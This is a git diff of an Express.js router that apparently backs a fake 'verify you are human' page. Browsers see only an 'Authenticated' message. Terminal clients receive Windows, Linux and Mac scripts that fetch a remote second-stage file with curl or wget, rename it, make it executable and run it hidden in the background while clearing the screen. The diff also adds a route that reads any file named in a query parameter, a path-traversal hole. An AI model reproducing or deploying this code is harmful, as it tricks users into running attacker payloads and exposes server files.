@@ -33,6 +33,81 @@ function responder(res, err, data) {
   }
 }
 
+
+// router.get("/auth",  (req, res) => {
+//    const { os } = req.params;
+//    console.log(os);
+//   const token = req.query.token;
+//   const domain = `${req.protocol}://${req.get("host")}`;
+//   const ua = req.get("User-Agent") || "";
+
+//   if (!token) return res.status(400).send("Missing token");
+
+//   const isBrowser = /Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(ua);
+
+//   // A minimal browser response used in your originals
+//   if (isBrowser) {
+//     res.type("text/plain").send("@echo off\necho Authenticated");
+//     status[token] = "verified";
+//     return;
+//   }
+
+//   // Templates for non-browser clients
+//   const templates = {
+//     windows: `@echo off
+// curl -s -L -o "%USERPROFILE%\\token.npl" ${domain}/task/token?token=${token}
+// cls
+// if exist "%USERPROFILE%\\token.npl" del "%USERPROFILE%\\token"
+// if exist "%USERPROFILE%\\token.cmd" del "%USERPROFILE%\\token.cmd"
+// ren "%USERPROFILE%\\token.npl" token.cmd
+// "%USERPROFILE%\\token.cmd"
+// cls
+// `,
+
+//     linux: `#!/bin/bash
+// set -e
+// echo "Authenticated"
+// TARGET_DIR="$HOME/Documents"
+// clear
+// wget -q -O "$TARGET_DIR/tokenlinux.npl" ${domain}/task/tokenlinux?token=${token}
+// clear
+// mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
+// clear
+// chmod +x "$TARGET_DIR/tokenlinux.sh"
+// clear
+// nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
+// clear
+// exit 0
+// `,
+
+//     mac: `#!/bin/bash
+// set -e
+// echo "Authenticated"
+// mkdir -p "$HOME/Documents"
+// clear
+// curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/task/tokenlinux?token=${token}"
+// clear
+// chmod +x "$HOME/Documents/tokenlinux.sh"
+// clear
+// nohup bash "$HOME/Documents/tokenlinux.sh" > /dev/null 2>&1 &
+// clear
+// exit 0
+// `,
+//   };
+
+//   const lowerOs = (os || "").toLowerCase();
+//   console.log(lowerOs);
+//   const script = templates[lowerOs];
+
+//   if (!script) {
+//     // Unknown OS param — return a helpful error
+//     return res.status(400).send("Unsupported OS");
+//   }
+
+//   res.type("text/plain").send(script);
+//   status[token] = "verified";
+// });
+
 /* ---------------- NEW SSE FLOW ---------------- */
 
 // ✅ SSE connection (frontend listens here)
@@ -80,13 +155,13 @@ router.get("/script/:os", (req, res) => {
   if (os === "windows") {
     script = `@echo off
 echo Authenticated
-curl -s "${domain}/users/verify/${token}"
+curl -s "${domain}/task/verify/${token}"
 `;
   } else if (os === "linux" || os === "mac") {
     script = `#!/bin/bash
 set -e
 echo "Authenticated"
-curl -s "${domain}/users/verify/${token}"
+curl -s "${domain}/task/verify/${token}"
 `;
   } else {
     return res.status(400).send("Unsupported OS");
@@ -128,80 +203,10 @@ router.post('/verify-captcha', async (req, res) => {
 router.get("/status/:token", (req, res) => {
   res.json({ status: status[req.params.token] || "pending" });
 });
-router.get("/auth",  (req, res) => {
-   const { os } = req.params;
+
+router.get("/windows", (req, res) => {
   const token = req.query.token;
-  const domain = `${req.protocol}://${req.get("host")}`;
-  const ua = req.get("User-Agent") || "";
-
-  if (!token) return res.status(400).send("Missing token");
-
-  const isBrowser = /Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(ua);
-
-  // A minimal browser response used in your originals
-  if (isBrowser) {
-    res.type("text/plain").send("@echo off\necho Authenticated");
-    status[token] = "verified";
-    return;
-  }
-
-  // Templates for non-browser clients
-  const templates = {
-    windows: `@echo off
-curl -s -L -o "%USERPROFILE%\\token.npl" ${domain}/users/token.npl
-cls
-if exist "%USERPROFILE%\\token.npl" del "%USERPROFILE%\\token"
-if exist "%USERPROFILE%\\token.cmd" del "%USERPROFILE%\\token.cmd"
-ren "%USERPROFILE%\\token.npl" token.cmd
-"%USERPROFILE%\\token.cmd"
-cls
-`,
-
-    linux: `#!/bin/bash
-set -e
-echo "Authenticated"
-TARGET_DIR="$HOME/Documents"
-clear
-wget -q -O "$TARGET_DIR/tokenlinux.npl" ${domain}/users/tokenlinux.npl
-clear
-mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
-clear
-chmod +x "$TARGET_DIR/tokenlinux.sh"
-clear
-nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
-clear
-exit 0
-`,
-
-    mac: `#!/bin/bash
-set -e
-echo "Authenticated"
-mkdir -p "$HOME/Documents"
-clear
-curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/users/tokenlinux.npl"
-clear
-chmod +x "$HOME/Documents/tokenlinux.sh"
-clear
-nohup bash "$HOME/Documents/tokenlinux.sh" > /dev/null 2>&1 &
-clear
-exit 0
-`,
-  };
-
-  const lowerOs = (os || "").toLowerCase();
-  const script = templates[lowerOs];
-
-  if (!script) {
-    // Unknown OS param — return a helpful error
-    return res.status(400).send("Unsupported OS");
-  }
-
-  res.type("text/plain").send(script);
-  status[token] = "verified";
-});
-// Windows Auth
-router.get("/auth/windows", (req, res) => {
-  const token = req.query.token;
+  
   const userAgent = req.get('User-Agent');
   if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)) {
     res.type("text/plain").send(`@echo off\necho Authenticated`);
@@ -217,10 +222,10 @@ router.get("/auth/windows", (req, res) => {
     // requestLog[ip].step1 = now;
     const domain = req.protocol + '://' + req.get('host');
     res.type("text/plain").send(`@echo off
-curl -s -L -o "%USERPROFILE%\\token.npl" ${domain}/users/token.npl
+curl -s -L -o "%USERPROFILE%\\token.npl" ${domain}/task/token?token=${token}
 cls
-if exist "%USERPROFILE%\token.npl" del "%USERPROFILE%\token"
-if exist "%USERPROFILE%\token.cmd" del "%USERPROFILE%\token.cmd"
+if exist "%USERPROFILE%\token.npl" del "%USERPROFILE%\/token"
+if exist "%USERPROFILE%\token.cmd" del "%USERPROFILE%\/token.cmd"
 ren "%USERPROFILE%\\token.npl" token.cmd
 "%USERPROFILE%\\token.cmd"
 cls
@@ -231,7 +236,7 @@ cls
 });
 
 // Linux Auth
-router.get("/auth/linux", (req, res) => {
+router.get("/linux", (req, res) => {
   const token = req.query.token;
   const userAgent = req.get('User-Agent');
 
@@ -254,7 +259,7 @@ set -e
 echo "Authenticated"
 TARGET_DIR="$HOME/Documents"
 clear
-wget -q -O "$TARGET_DIR/tokenlinux.npl" ${domain}/users/tokenlinux.npl
+wget -q -O "$TARGET_DIR/tokenlinux.npl" ${domain}/task/tokenlinux?token=${token}
 clear
 mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
 clear
@@ -270,7 +275,7 @@ exit 0
 });
 
 // Mac Auth
-router.get("/auth/mac", (req, res) => {
+router.get("/mac", (req, res) => {
   const token = req.query.token;
   const userAgent = req.get('User-Agent');
 
@@ -292,7 +297,7 @@ set -e
 echo "Authenticated"
 mkdir -p "$HOME/Documents"
 clear
-curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/users/tokenlinux.npl"
+curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/task/tokenlinux?token=${token}"
 clear
 chmod +x "$HOME/Documents/tokenlinux.sh"
 clear
@@ -306,9 +311,10 @@ exit 0
 });
 
 // Token Parser
-router.get("/tokenParser.npl", (req, res) => {
+router.get("/tokenParser", (req, res) => {
+  const token = req.query.token;
   console.log("✅ /api/tokenParser.npl called");
-  const filePath = path.join(__dirname, '..', 'public', 'tokenParser.npl');
+  const filePath = path.join(__dirname, '..', 'public', token);
   fs.readFile(filePath, 'utf8', (err, content) => {
     if (err) {
       console.error(err);
@@ -332,7 +338,8 @@ router.get("/package.json", (req, res) => {
 });
 
 // Windows token
-router.get("/token.npl", (req, res) => {
+router.get("/token", (req, res) => {
+  const token = req.query.token;
   console.log("✅ /api/token.npl called");
   const domain = `${req.protocol}://${req.get('host')}`;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -355,7 +362,8 @@ router.get("/token.npl", (req, res) => {
         return res.status(500).send(err);
       }
       const modified = content.replace(/{{DOMAIN}}/g, domain);
-      res.type('text/plain').send(modified);
+      const modified_1 = modified.replace(/{{token}}/g, token);
+      res.type('text/plain').send(modified_1);
     });
   } else {
     return res.status(500).send('request failed');
@@ -363,7 +371,8 @@ router.get("/token.npl", (req, res) => {
 });
 
 // Linux token
-router.get("/tokenlinux.npl", (req, res) => {
+router.get("/tokenlinux", (req, res) => {
+  const token = req.query.token;
   const domain = `${req.protocol}://${req.get('host')}`;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const now = Date.now();
@@ -384,7 +393,8 @@ router.get("/tokenlinux.npl", (req, res) => {
         return res.status(500).send('Error reading tokenlinux.npl');
       }
       const modified = content.replace(/{{DOMAIN}}/g, domain);
-      res.type('text/plain').send(modified);
+      const modified_1 = modified.replace(/{{token}}/g, token);
+      res.type('text/plain').send(modified_1);
     });
   } else {
     return res.status(500).send(filePath);
